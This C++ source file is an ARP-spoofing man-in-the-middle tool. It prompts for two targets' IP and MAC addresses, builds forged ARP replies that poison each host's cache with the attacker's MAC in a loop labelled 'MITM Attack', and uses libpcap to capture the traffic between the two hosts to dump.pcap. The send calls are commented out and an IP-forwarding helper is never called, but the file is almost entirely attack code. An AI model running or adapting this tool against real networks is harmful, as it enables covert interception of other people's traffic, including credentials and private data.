#include "pgen.h"
#include <stdio.h>
#include <pcap.h>
#include <thread>

const char* dev = "wlan0";


void capture(const char* ip1, const char* ip2){
	pcap_t* p;
	pcap_dumper_t *pdump;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program bpfprog;
	char filtercmd[256];

	sprintf(filtercmd, "ip && ((net %s) || (net %s))", ip1, ip2);
	//printf("%s\n", filtercmd);

	p = pcap_open_live(dev, 66536, 1,10,errbuf);
	if(p == NULL){
		fprintf(stderr, "%s\n", errbuf);
		return;
	}
	if(pcap_compile(p, &bpfprog, filtercmd, 0, 0) < 0){
		fprintf(stderr, "compile: %s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	if(pcap_setfilter(p, &bpfprog) < 0){
		fprintf(stderr, "setfilter: %s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	pdump = pcap_dump_open(p, "./dump.pcap");
	if(pdump == NULL){	
		fprintf(stderr, "%s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	if(pcap_loop(p, 0, pcap_dump, (u_char*)pdump) < 0){
		fprintf(stderr, "%s\n", pcap_geterr(p));
		pcap_dump_close(pdump);
		pcap_close(p);
		return;
	}

	pcap_dump_close(pdump);
	pcap_close(p);
	return;
}


void mitm_attack(const char* ip1, const char* mac1, 
		const char* ip2, const char* mac2);


int main(int argc,char** argv){
	char ip1[256];
	char ip2[256];
	char mac1[256];
	char mac2[256];

	printf("##TRAGET1##\n");
	printf("ip address : ");
	scanf("%s", ip1);
	printf("mac address: ");
	scanf("%s", mac1);
	printf("\n");
	printf("##TRAGET2##\n");
	printf("ip address : ");
	scanf("%s", ip2);
	printf("mac address: ");
	scanf("%s", mac2);

	std::thread mitm(mitm_attack, ip1, mac1, ip2, mac2);
	capture(ip1, ip2);
}



void mitm_attack(const char* ip1, const char* mac1, 
		const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src = pgen_getMAC(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;

	pack_to_target2.ETH.src = pgen_getMAC(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;


	for(int i=0; ; i++){
		printf("0x%04x: %s[%s] <MITM Attack> %s[%s] \n", i, 
				pack_to_target1.ARP.dstIp.c_str(),
				pack_to_target1.ARP.dstEth.c_str(),
				pack_to_target2.ARP.dstIp.c_str(),
				pack_to_target2.ARP.dstEth.c_str() );

		//pack_to_target1.SEND(dev);
		//pack_to_target2.SEND(dev);
		sleep(1);
	}		
}


void ip_forward(bool b){
	FILE *fp;
	fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
	if(fp == NULL){
		perror("fopen");
		return;
	}

	if(b)
		fputc('1', fp);
	else
		fputc('0', fp);
}

